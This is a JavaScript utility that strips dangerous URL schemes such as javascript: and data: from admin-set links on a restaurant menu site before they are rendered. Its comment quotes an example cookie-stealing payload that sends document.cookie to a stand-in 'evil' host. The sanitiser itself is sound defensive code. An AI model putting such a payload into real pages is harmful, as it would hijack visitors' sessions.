// Neutralises dangerous URL schemes before a tenant-controlled value is bound
// to an <a href>. A restaurant admin sets social links and branch map URLs; a
// value like `javascript:fetch('//evil?c='+document.cookie)` would run in the
// public menu origin on tap. Only http(s), mailto and tel are allowed through;
// everything else (javascript:, data:, vbscript:, …) collapses to null so the
// link is dropped rather than rendered.
const ALLOWED = ['http:', 'https:', 'mailto:', 'tel:']

export function safeUrl(value) {
    if (typeof value !== 'string') return null
    const trimmed = value.trim()
    if (trimmed === '') return null
    try {
        // Resolve against the current origin so protocol-relative and relative
        // URLs normalise; the scheme check below is what actually gates it.
        const parsed = new URL(trimmed, window.location.origin)
        return ALLOWED.includes(parsed.protocol) ? trimmed : null
    } catch {
        return null
    }
}
